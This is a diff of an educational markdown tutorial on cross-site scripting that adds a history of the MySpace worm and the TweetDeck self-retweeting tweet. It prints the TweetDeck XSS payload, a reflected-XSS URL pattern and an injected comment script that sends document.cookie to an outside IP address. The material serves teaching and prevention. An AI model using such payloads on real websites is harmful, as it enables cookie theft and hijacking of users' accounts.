@@ -20,7 +20,7 @@ Cross Site Scripting (XSS) is the most exploited web application vulnerability t
 XSS is a type of injection, in which malicious code are injected into trusted websites. XSS flaws that allow these attacks to happen are widespread and can occur anywhere a web application uses input from a user to generate an output on the website without validating it or encoding it. 
 
 ## Why do you need to know about XSS?
-As software engineers, or aspiring software engineers, it is highly likely that we will build web applications. It is important to know how we can protect our web applications against XSS, so that it will not be a become tool for attackers. 
+As software engineers, or aspiring software engineers, it is highly likely that we will build web applications. It is important to know how we can protect our web applications against XSS, so that it will not become a tool for attackers.
 
 ## How does XSS work?
 One of the most common ways to accept inputs from users are text boxes. In this example, we will look at a website that allows users to enter their comments to blog posts. 
@@ -66,19 +66,18 @@ Therefore, the malicious user has managed to add additional "functionalities" to
 
 > Trivia: The term "Cross Site Scripting" is actually an old term. It originally describe an attack whereby hackers write malicious JavaScript scripts on a separate website, and injects it into the victim's website, in order to steal data from the victim's website/deface the page (hence "Cross Site"). Such attacks are no longer possible today, and the modern definition of "Cross Site Scripting" includes attacks that do not need to be on a separate website to work.
 
-## Types of Cross Site Scripting
+## Types of XSS
 
 There are no standard definitions, but there are at least two different types of
 XSS:
 
-* Persistent XSS (also known as stored XSS) - The JavaScript code gets stored in
+* Persistent XSS (also known as stored XSS) - The injected JavaScript code gets stored in
 the web server. Example: Posting a malicious JavaScript code into a blog post as
-a comment. The comment gets stored in the database, and the web browser of future visitors of the
-webpage will retrieve the comment from the database, resulting in execution.
+a comment. The comment gets stored in the server database, and when visitors visit the webpage, their web browsers will retrieve the comment from the database and run the malicious JavaScript code automatically.
 
 * Non-persistent XSS (also known as reflected XSS) - The JavaScript code is
 inserted in URL/links of website that accepts URL parameters as input. The input
-is therefore not stored in a database.
+is not stored in the server database.
 
 An example of a non-persistent XSS attack would be an e-card website that displays an e-card to a visitor of the website. The e-card can be customised by modifying the `content` parameter of the URL:
 
@@ -87,6 +86,34 @@ An example of a non-persistent XSS attack would be an e-card website that displa
 However, that also means that hackers are able to also include scripts in their e-card content. They can send this URL to victims, hoping that they will click on them, resulting in the scripts being executed:
 
 `https://www.ecard.com/view-ecard.php?content=Happy%20Holidays<script>...</script>`
+
+## Well-Known XSS Incidents
+
+**MySpace Worm**
+
+In 2005, MySpace allowed users to customise their profiles using HTML code. This allowed for diversity of profiles but also allowed Samy Kamkar to find an XSS vulnerability. 
+
+Samy Kamkar wrote a script which made people who visited his profile send him a friend request, and list Samy’s in their own profile’s “My Heroes” section. Not only that, he also programmed the script to copy itself onto the visitor's profile. Within a day, he had 1 million friend requests. 
+
+This caused MySpace to take the site offline to figure out what was going on and to purge the worm. 
+
+You can read the detailed article <a href="https://motherboard.vice.com/en_us/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever" target="_blank">here</a>.
+
+**Self-Retweeting Tweet**
+
+In 2014, a tweet became the world's first retweeting tweet. Twitter itself has security measures against XSS and is thus unaffected. However, users on TweetDeck (Twitter social media dashboard application) that came across this tweet will automatically retweet this tweet:
+
+```html
+<script class="xss">
+$('.xss').parents().eq(1).find('a').eq(1).click();
+$('[data-action=retweet]').click();
+alert('XSS in Tweetdeck')
+</script> ♥
+```
+
+The first line selects the retweet button and then clicks it, and the second line confirms the action by clicking ok on the modal tht confirms the retweet. Recall that if a Tweetdeck user saw this tweet back then he will only see "♥", the script contents will not be seen. 
+
+You can still see this tweet <a href="https://twitter.com/dergeruhn/status/476764918763749376?lang=en" target="_blank">here</a>.
 
 ## How to prevent XSS?
 
@@ -103,7 +130,7 @@ In the above example, the comment section will become like this:
 That's a very nice picture! <br>
 Good photograph! <br>
 I **like** your photograph! <br>
-This is an innocent looking comment. <script>sendToServer("http://139.241.0.3/", document.cookie)</script>
+This is an innocent looking comment. `<script>sendToServer("http://139.241.0.3/", document.cookie)</script>`
 
 The `<script>` and `</script>` will be displayed as text rather than being run as Javascript by the browser.
 
